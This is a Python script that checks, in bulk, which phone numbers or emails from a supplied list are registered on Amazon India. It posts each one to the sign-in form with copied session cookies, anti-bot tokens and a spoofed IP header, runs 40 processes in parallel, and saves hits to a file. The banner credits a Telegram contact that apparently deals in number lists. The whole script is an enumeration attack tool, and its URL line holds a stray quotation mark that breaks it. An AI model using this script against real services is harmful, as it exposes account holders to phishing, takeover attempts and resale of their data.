import requests,urllib3
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

class Amazon():
	def __init__(self,num):
		self.url  = "https://www.amazon.in/ap/signin""
		self.num = num
		self.redirect = None
		self.workflowState = None
		self.appActionToken = None
		self.openid = None
		self.prevRID = None
		
	def check(self):
		cookies = {"session-id": "262-6899214-0753700", "session-id-time": "2289745062l", "i18n-prefs": "INR", "csm-hit": "tb:6NWTTM14VJ00ZAVVBZ3X+b-36CP76CGQ52N3TB0HZG8|1659025064788&t:1659025064788&adb:adblk_no", "ubid-acbin": "257-4810331-3732018", "session-token": "\"tyoeHgowknphx0Y/CBaiVwnBiwbhUb1PRTvQZQ+07Tq9rmkRD6bErsUDwgq6gu+tA53K6WEAMwOb3pN4Ti3PSFoo+I/Jt5qIEDEMHIeRo1CrE264ogGDHsjge/CwWUZ9bVZtbo32ej/ZPQdm8bYeu6TQhca+UH7Wm9OOwBGoPl7dfoUk79QLYEz69Tt3ik4zMJom8jfgI227qMPuaMaAsw==\""}
		headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate","DNT":"1", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.amazon.in", "Connection": "close", "X-Forwarded-For": "127.0.0.1", "Referer": "https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
		data = {"appActionToken": "Aok8C9I71Cr17vp22ONGvDUXR8Yj3D", "appAction": "SIGNIN_PWD_COLLECT", "subPageType": "SignInClaimCollect", "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmluLz9yZWZfPW5hdl95YV9zaWduaW4=", "prevRID": "ape:MzZDUDc2Q0dRNTJOM1RCMEhaRzg=", "workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.tCHWdlv4kSSigZCZiGfSCYgnReddxq7c0cUpf0dxYqYzWU-ZHIL0mQ.eP-cXQNtVyBr4q_g.fNRQAD5f18IU0nmqT7IwklJZV-_b60As-_dvyVd4MMjDpiMoGFJ0edbmuL8GJKT_BEE7ClwIpUYOtUtejr7v8qCRy4iD6bg_eBRSnTmZiXzVsx4EuL241zhoriZ7FpXS2seG82sx85C2udl1sPRQyKnO1zIqulOCechL_LzBmIRDv9ngzfij-nYmjWrDpZvAXiKCclR9v0UYh_SqjjOIrStMC53AlWjH-hYdDkXWSeTyHchFi9Ij4ndOgJb9tKNucA4_j7Uy-R0wvB9zlwEfQNa3394guXjjz6IR3TVMjw41bySCYbHLf6j5oj-5xh6UZm2CsW7DE5gqbHmlq5Nv8zLvTRTO9HJvM9Wr36R1eDRN.wZAX4qr9VTROJR9qdWbHfw", "email": self.num, "password": '', "create": "0", "metadata1": "ECdITeCs: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"}
		res = requests.post(self.url, headers=headers, cookies=cookies, data=data).text
		
		if "ap_change_login_claim" in res:
			return True,res
		elif "There was a problem" in res:
			return False,res
		else:
			return False,res

class INDEx():
	def __new__ (self):
		print("""
		
Script Started - 
				By @ta9ra9pa9
		contact https://t.me/datanumbersunlimited
		
		""")


def fun_action(num):
	
	num = num.strip()
	
	if num.isnumeric() and "+" not in num:
		num = "+%s" % num
	elif "@" in num:
		pass
	else:
		pass
			
	while True:
		try:
			A , Error = Amazon(num).check()
			
			if A:
				with open("Valid.txt","a") as ff:
					ff.write("%s\n" % num)
				print("[+] Yes ==> %s"  % num) 
				break
				
			else:
				
				print("[-] No ==> %s"  % num) 
				break
		except:pass
		
def main():
	
	# ~ INDEx()
	
	email = open( input("[-] List Name : ")  ,"r",encoding="Latin-1").read().splitlines()
	ThreadPool = Pool(40)
	ThreadPool.map(fun_action, email)


if __name__ == "__main__":
	INDEx()

	main()
